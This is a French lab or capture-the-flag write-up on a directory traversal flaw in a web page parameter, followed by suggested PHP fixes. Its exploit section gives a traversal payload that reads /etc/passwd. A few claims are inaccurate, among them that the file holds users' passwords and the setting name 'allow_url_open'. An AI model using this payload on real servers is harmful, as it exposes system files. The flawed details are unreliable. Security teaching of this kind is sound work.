# Recherche

- Lorsque l'on se déplace **de pages en pages**, on peut voir dans l'URL: `$ip/?page=nom_de_la_page`

- On peut donc essayer de **changer la valeur** de `page` pour voir si on peut acceder à **d'autres pages**.

- Lorsque l'on remplace `page`, on obtient une **alerte** avec le message `Wtf ?`. Être **redirigé** en entrant une **valeur invalide** est logique mais l'alerte et le message sont [**suspects**](https://www.youtube.com/watch?v=McguBufbsQs).

# Exploit

- L'utilisation de `../../` après `page` dans l'URL est une technique connue sous le nom de **Directory Traversal** ou **Path Traversal**. Cette technique est utilisée pour **accéder** à des **fichiers et des répertoires** qui sont stockés en **dehors de la racine** du serveur web.

```javascript
$ip/?page=../
alerte : Wtf ?
$ip/?page=../../
alerte : Wrong..
$ip/?page=../../../
alerte : Nope..
$ip/?page=../../../../
alerte : Almost..
$ip/?page=../../../../../
alerte : Still nope..
$ip/?page=../../../../../../
alerte : Nope..
$ip/?page=../../../../../../../
alerte : You can DO it !!!  :]
```

- Un fois arriver à **7** retour en arrière, le message **ne change plus** en ajoutant des `../`, ce qui veut dire que nous somme à la **racine du serveur web**.

- On peut alors acceder au fichier `etc/passwd` qui contient les **logins** et **mots de passe** des utilisateurs du système.

```javascript
$ip/?page=../../../../../../../etc/passwd
alerte : Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 
```

# Fix

- Retirer les occurrences de `../` dans les requêtes **GET** afin d’éviter les attaques de type **Directory Traversal**.

- Assurer que toutes les **entrées utilisateur**, y compris les **valeurs des paramètres d'URL**, sont **validées avant d'être utilisées**. Les entrées devraient être **vérifiées** pour s'assurer qu'elles **respectent le format attendu**.

```PHP
$allowed_pages = ['home', 'contact', 'about'];
$page = $_GET['page'];
if (!in_array($page, $allowed_pages)) {
    die('Invalid page');
}
```

- **Encoder** les valeurs des paramètres d'URL pour éviter que des **caractères spéciaux** ne soient **interprétés** de manière **incorrecte**.

```PHP
$page = urlencode($_GET['page']);
```

- Désactiver `allow_url_open` et `allow_url_include` dans le fichier `php.ini` afin **d’empêcher** l'utilisation d'URL **non autorisées**.

